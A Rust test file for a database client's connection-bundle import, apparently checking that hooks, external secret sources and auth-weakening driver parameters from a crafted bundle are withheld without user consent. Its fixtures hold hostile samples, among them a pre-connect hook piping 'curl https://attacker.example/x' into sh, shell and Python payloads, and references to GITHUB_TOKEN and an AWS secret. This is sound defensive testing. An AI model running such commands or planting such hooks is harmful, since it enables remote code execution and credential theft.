use std::sync::Mutex;

use dbflux_core::values::ValueRef;
use dbflux_core::{
    CancelToken, ConnectionHook, ConnectionHooks, ConnectionProfile, DriverParam, HookContext,
    HookExecutor, HookPhase, HookResult, HookRunner, ScriptLanguage,
};

use super::*;
use crate::import::{apply, parse, plan};
use crate::{DestSnapshot, ResolutionChoices};

/// A bundle written by hand, as an attacker would: one connection to a
/// host of its choosing with a hook of every kind, a value source of every
/// non-literal kind and driver parameters that weaken MySQL authentication
/// next to harmless ones.
const CRAFTED_BUNDLE: &str = r#"
[bundle]
format_version = 1
created_at = "2026-10-31T00:00:00Z"
dbflux_version = "0.9.0"
encryption = "none"

[[connections]]
local_id = "c1"
name = "Team prod"
driver_id = "mysql"
kind = "MySQL"
include_hooks = true
driver_params = [
    { key = "compress", value = "true" },
    { key = "tcp_connect_timeout_ms", value = "5000" },
    { key = "enable_cleartext_plugin", value = "true" },
    { key = "secure_auth", value = "false" },
]

[connections.fields]
host = "db.attacker.example"
port = "3306"
user = "admin"

[connections.value_refs.password]
source = "env"
key = "GITHUB_TOKEN"

[connections.value_refs.user]
source = "dotenv"
path = "~/work/.env"
key = "DB_USER"

[connections.value_refs.database]
source = "secret"
provider = "aws-secrets-manager"
locator = "arn:aws:secretsmanager:eu-west-1:123456789012:secret:prod/db"
json_key = "password"

[connections.value_refs.port]
source = "literal"
value = "3306"

[[connections.hooks_payload.pre_connect]]
kind = "command"
command = "sh"
args = ["-c", "curl https://attacker.example/x | sh"]

[[connections.hooks_payload.post_connect]]
kind = "script"
language = "bash"
source = { type = "file", path = "/tmp/payload.sh" }

[[connections.hooks_payload.pre_disconnect]]
kind = "lua"
source = { type = "inline", content = "dbflux.process.run('python3', {'-c', 'print(1)'})" }
capabilities = { process_run = true }
"#;

fn empty_dest() -> DestSnapshot<'static> {
    DestSnapshot {
        auth_profiles: vec![],
        ssh_tunnels: vec![],
        proxies: vec![],
        connections: vec![],
    }
}

fn import_crafted(consent: ImportConsent) -> crate::ImportActions {
    let parsed = parse(CRAFTED_BUNDLE.as_bytes()).expect("crafted bundle parses");
    let import_plan = plan(&parsed, &empty_dest());
    let choices = ResolutionChoices {
        consent,
        ..ResolutionChoices::default()
    };
    apply(&parsed, &import_plan, &choices).expect("apply")
}

fn only_connection(actions: &crate::ImportActions) -> &ConnectionProfile {
    assert_eq!(actions.connections.len(), 1, "one connection imported");
    &actions.connections[0]
}

/// Records every hook the runner hands it instead of running anything.
#[derive(Default)]
struct RecordingExecutor {
    ran: Mutex<Vec<String>>,
}

impl HookExecutor for RecordingExecutor {
    fn execute_hook(
        &self,
        hook: &ConnectionHook,
        _context: &HookContext,
        _cancel_token: &CancelToken,
        _parent_cancel_token: Option<&CancelToken>,
        _output: Option<&dbflux_core::OutputSender>,
        _detached: Option<&dbflux_core::DetachedProcessSender>,
    ) -> Result<HookResult, String> {
        self.ran
            .lock()
            .map_err(|_| "poisoned".to_string())?
            .push(hook.display_command());
        Ok(HookResult {
            exit_code: Some(0),
            stdout: String::new(),
            stderr: String::new(),
            timed_out: false,
            detached: false,
            warnings: vec![],
        })
    }
}

/// Runs every phase the way a connect and disconnect do: hooks resolved
/// from the profile, handed to the runner.
fn hooks_run_on_connect_cycle(profile: &ConnectionProfile) -> Vec<String> {
    let hooks = ConnectionHooks::resolve_from_bindings(profile, &HashMap::new());
    let executor = RecordingExecutor::default();
    let context = HookContext::from_profile(profile);

    for phase in PHASES {
        HookRunner::run_phase(
            phase,
            hooks.phase_hooks(phase),
            &context,
            &CancelToken::new(),
            None,
            &executor,
        );
    }

    executor.ran.into_inner().unwrap_or_default()
}

fn hook_entry(kind_toml: &str) -> ParsedBundle {
    let text = format!(
        r#"
[bundle]
format_version = 1
created_at = "2026-10-31T00:00:00Z"
dbflux_version = "0.9.0"
encryption = "none"

[[connections]]
local_id = "c1"
name = "One hook"
driver_id = "postgres"
kind = "Postgres"
include_hooks = true

[connections.fields]
host = "db.example"

[[connections.hooks_payload.pre_connect]]
{kind_toml}
"#
    );
    parse(text.as_bytes()).expect("hook bundle parses")
}

fn assert_hook_dropped_and_never_runs(kind_toml: &str) {
    let parsed = hook_entry(kind_toml);
    let import_plan = plan(&parsed, &empty_dest());
    let actions = apply(&parsed, &import_plan, &ResolutionChoices::default()).expect("apply");
    let profile = only_connection(&actions);

    assert!(profile.hooks.is_none(), "no hooks without consent");
    assert!(
        hooks_run_on_connect_cycle(profile).is_empty(),
        "connecting the imported profile must run nothing"
    );
    assert_eq!(actions.withheld.len(), 1);
    assert_eq!(actions.withheld[0].hooks, 1);
}

// ---------------------------------------------------------------------------
// Hooks
// ---------------------------------------------------------------------------

#[test]
fn a_command_hook_is_not_imported_without_consent() {
    assert_hook_dropped_and_never_runs(
        r#"kind = "command"
command = "sh"
args = ["-c", "touch /tmp/pwned"]"#,
    );
}

#[test]
fn a_script_hook_is_not_imported_without_consent() {
    assert_hook_dropped_and_never_runs(
        r#"kind = "script"
language = "python"
interpreter = "/tmp/evil"
source = { type = "inline", content = "import os; os.system('id')" }"#,
    );
}

#[test]
fn a_lua_hook_is_not_imported_without_consent() {
    assert_hook_dropped_and_never_runs(
        r#"kind = "lua"
source = { type = "inline", content = "dbflux.process.run('sh', {'-c', 'id'})" }
capabilities = { process_run = true }"#,
    );
}

#[test]
fn hooks_of_every_kind_import_and_run_with_consent() {
    let actions = import_crafted(ImportConsent {
        hooks: true,
        external_values: false,
    });
    let profile = only_connection(&actions);

    let ran = hooks_run_on_connect_cycle(profile);
    assert_eq!(
        ran,
        vec![
            "sh -c curl https://attacker.example/x | sh".to_string(),
            "bash /tmp/payload.sh".to_string(),
            "lua <inline script>".to_string(),
        ],
        "every bundle hook runs once the user consented"
    );
}

#[test]
fn hook_consent_alone_keeps_no_value_sources_or_risky_params() {
    let actions = import_crafted(ImportConsent {
        hooks: true,
        external_values: false,
    });
    let profile = only_connection(&actions);

    assert!(profile.hooks.is_some());
    assert!(profile.value_refs.values().all(|v| !v.needs_resolution()));
    assert!(
        !profile
            .driver_params
            .iter()
            .any(|p| p.key == "enable_cleartext_plugin")
    );
}

// ---------------------------------------------------------------------------
// Value sources
// ---------------------------------------------------------------------------

#[test]
fn an_env_value_source_is_stripped_without_consent() {
    let actions = import_crafted(ImportConsent::default());
    let profile = only_connection(&actions);

    assert!(!profile.value_refs.contains_key("password"));
}

#[test]
fn a_dotenv_value_source_is_stripped_without_consent() {
    let actions = import_crafted(ImportConsent::default());
    let profile = only_connection(&actions);

    assert!(!profile.value_refs.contains_key("user"));
}

#[test]
fn a_secrets_manager_value_source_is_stripped_without_consent() {
    let actions = import_crafted(ImportConsent::default());
    let profile = only_connection(&actions);

    assert!(!profile.value_refs.contains_key("database"));
}

#[test]
fn parameter_and_auth_value_sources_are_stripped_without_consent() {
    let mut parsed = parse(CRAFTED_BUNDLE.as_bytes()).expect("parses");
    let entry = &mut parsed.bundle.connections[0];
    for (field, vref) in [
        ("host", ValueRef::parameter("aws-ssm", "/prod/db/host")),
        ("ssl_key", ValueRef::auth("secret_access_key")),
    ] {
        let jv = serde_json::to_value(&vref).expect("serialize");
        entry
            .value_refs
            .insert(field.to_string(), toml::Value::try_from(jv).expect("toml"));
    }

    let import_plan = plan(&parsed, &empty_dest());
    let actions = apply(&parsed, &import_plan, &ResolutionChoices::default()).expect("apply");
    let profile = only_connection(&actions);

    assert!(!profile.value_refs.contains_key("host"));
    assert!(!profile.value_refs.contains_key("ssl_key"));
}

#[test]
fn literal_value_sources_import_without_consent() {
    let actions = import_crafted(ImportConsent::default());
    let profile = only_connection(&actions);

    let refs: Vec<&String> = profile.value_refs.keys().collect();
    assert_eq!(refs, vec!["port"], "only the literal is left");
    assert_eq!(actions.withheld[0].value_refs, 3);
}

#[test]
fn every_value_source_imports_with_consent() {
    let actions = import_crafted(ImportConsent {
        hooks: false,
        external_values: true,
    });
    let profile = only_connection(&actions);

    assert!(matches!(
        profile.value_refs.get("password"),
        Some(ValueRef::Env { key }) if key == "GITHUB_TOKEN"
    ));
    assert!(matches!(
        profile.value_refs.get("user"),
        Some(ValueRef::Dotenv { path, key }) if path == "~/work/.env" && key == "DB_USER"
    ));
    assert!(matches!(
        profile.value_refs.get("database"),
        Some(ValueRef::Secret { provider, .. }) if provider == "aws-secrets-manager"
    ));
    assert!(profile.hooks.is_none(), "value consent keeps no hooks");
}

// ---------------------------------------------------------------------------
// Driver parameters
// ---------------------------------------------------------------------------

#[test]
fn risky_driver_params_are_stripped_without_consent() {
    let actions = import_crafted(ImportConsent::default());
    let profile = only_connection(&actions);

    assert_eq!(
        profile.driver_params,
        vec![
            DriverParam::new("compress", "true"),
            DriverParam::new("tcp_connect_timeout_ms", "5000"),
        ],
        "only the harmless parameters stay, in bundle order"
    );
    assert_eq!(actions.withheld[0].driver_params, 2);
}

#[test]
fn risky_driver_params_import_with_consent() {
    let actions = import_crafted(ImportConsent {
        hooks: false,
        external_values: true,
    });
    let profile = only_connection(&actions);

    assert_eq!(profile.driver_params.len(), 4);
    assert!(
        profile
            .driver_params
            .contains(&DriverParam::new("enable_cleartext_plugin", "true"))
    );
    assert!(
        profile
            .driver_params
            .contains(&DriverParam::new("secure_auth", "false"))
    );
}

#[test]
fn driver_params_that_weaken_auth_or_are_unknown_need_consent() {
    let needs = |key: &str, value: &str| driver_param_needs_consent(&DriverParam::new(key, value));

    assert!(needs("enable_cleartext_plugin", "true"));
    assert!(needs("enable_cleartext_plugin", " TRUE "));
    assert!(needs("secure_auth", "false"));
    assert!(needs("channel_binding", "disable"));
    assert!(needs("options", "-c search_path=evil"));
    assert!(needs("a_key_added_to_a_driver_later", "1"));
    assert!(needs("Compress", "true"), "keys match exactly");

    assert!(!needs("enable_cleartext_plugin", "false"));
    assert!(!needs("secure_auth", "true"));
    assert!(!needs("channel_binding", "require"));
    assert!(!needs("compress", "best"));
    assert!(!needs("connect_timeout", "10"));
    assert!(!needs("", "anything"));
}

// ---------------------------------------------------------------------------
// Review
// ---------------------------------------------------------------------------

#[test]
fn the_review_lists_every_hook_value_source_and_param() {
    let parsed = parse(CRAFTED_BUNDLE.as_bytes()).expect("parses");
    let review = review(&parsed);

    assert!(review.has_hooks());
    assert!(review.has_external_values());
    let conn = &review.connections[0];
    assert_eq!(conn.name, "Team prod");
    assert_eq!(conn.host.as_deref(), Some("db.attacker.example"));

    let hooks: Vec<(HookPhase, HookReviewKind)> =
        conn.hooks.iter().map(|h| (h.phase, h.kind)).collect();
    assert_eq!(
        hooks,
        vec![
            (HookPhase::PreConnect, HookReviewKind::Command),
            (
                HookPhase::PostConnect,
                HookReviewKind::Script(ScriptLanguage::Bash)
            ),
            (HookPhase::PreDisconnect, HookReviewKind::Lua),
        ]
    );
    assert_eq!(
        conn.hooks[0].command_line.as_deref(),
        Some("sh -c 'curl https://attacker.example/x | sh'"),
        "the full command, quoted the way it splits into arguments"
    );
    assert_eq!(
        conn.hooks[1].command_line.as_deref(),
        Some("bash /tmp/payload.sh")
    );
    assert!(conn.hooks[2].lua_process_run);
    assert!(
        conn.hooks[2]
            .excerpt
            .as_deref()
            .is_some_and(|e| e.contains("dbflux.process.run"))
    );

    let refs: Vec<(&str, ValueSourceKind, &str)> = conn
        .value_refs
        .iter()
        .map(|r| (r.field.as_str(), r.source, r.detail.as_str()))
        .collect();
    assert_eq!(
        refs,
        vec![
            (
                "database",
                ValueSourceKind::Secret,
                "aws-secrets-manager: arn:aws:secretsmanager:eu-west-1:123456789012:secret:prod/db#password"
            ),
            ("password", ValueSourceKind::Env, "GITHUB_TOKEN"),
            ("port", ValueSourceKind::Literal, ""),
            ("user", ValueSourceKind::Dotenv, "~/work/.env#DB_USER"),
        ]
    );

    let params: Vec<(&str, bool)> = conn
        .driver_params
        .iter()
        .map(|p| (p.key.as_str(), p.needs_consent))
        .collect();
    assert_eq!(
        params,
        vec![
            ("compress", false),
            ("tcp_connect_timeout_ms", false),
            ("enable_cleartext_plugin", true),
            ("secure_auth", true),
        ]
    );
}

#[test]
fn the_review_lists_exactly_what_full_consent_keeps() {
    let parsed = parse(CRAFTED_BUNDLE.as_bytes()).expect("parses");
    let conn = &review(&parsed).connections[0];

    let actions = import_crafted(ImportConsent::all());
    let profile = only_connection(&actions);
    let hooks = profile.hooks.as_ref().expect("hooks with consent");

    let kept_hooks: usize = PHASES.iter().map(|&p| hooks.phase_hooks(p).len()).sum();
    assert_eq!(conn.hooks.len(), kept_hooks);
    assert_eq!(conn.value_refs.len(), profile.value_refs.len());
    assert_eq!(conn.driver_params.len(), profile.driver_params.len());
    assert!(actions.withheld.is_empty());
}

#[test]
fn hooks_a_bundle_does_not_flag_as_included_are_neither_listed_nor_imported() {
    let mut parsed = parse(CRAFTED_BUNDLE.as_bytes()).expect("parses");
    parsed.bundle.connections[0].include_hooks = false;

    assert!(!review(&parsed).has_hooks());

    let import_plan = plan(&parsed, &empty_dest());
    let choices = ResolutionChoices {
        consent: ImportConsent::all(),
        ..ResolutionChoices::default()
    };
    let actions = apply(&parsed, &import_plan, &choices).expect("apply");
    assert!(only_connection(&actions).hooks.is_none());
}

#[test]
fn a_bundle_with_plain_settings_needs_no_review() {
    let mut parsed = parse(CRAFTED_BUNDLE.as_bytes()).expect("parses");
    let entry = &mut parsed.bundle.connections[0];
    entry.include_hooks = false;
    entry.value_refs.clear();
    entry.driver_params.clear();

    assert!(review(&parsed).is_empty());
}

#[test]
fn long_inline_scripts_are_cut_in_the_review() {
    let script = (0..40)
        .map(|i| format!("echo line {i}"))
        .collect::<Vec<_>>()
        .join("\n");
    let excerpt = script_excerpt(&script);

    assert!(excerpt.starts_with("echo line 0\n"));
    assert!(excerpt.ends_with('…'));
    assert!(!excerpt.contains("echo line 39"));
    assert!(script_excerpt(&"x".repeat(5000)).chars().count() <= EXCERPT_MAX_CHARS + 2);
}

#[test]
fn bundle_text_cannot_fake_review_lines_or_reorder_itself() {
    let mut parsed = parse(CRAFTED_BUNDLE.as_bytes()).expect("parses");
    let entry = &mut parsed.bundle.connections[0];
    entry.name = "Team\nprod \u{202E}lmth.exe".to_string();
    let vref = serde_json::to_value(ValueRef::env("TOKEN\nhost: fixed value")).expect("json");
    entry.value_refs.insert(
        "api".to_string(),
        toml::Value::try_from(vref).expect("toml"),
    );

    let review = review(&parsed);
    let conn = &review.connections[0];

    assert_eq!(conn.name, "Team\\u{a}prod \\u{202e}lmth.exe");
    let api = conn
        .value_refs
        .iter()
        .find(|r| r.field == "api")
        .expect("api ref listed");
    assert!(!api.detail.contains('\n'));
}
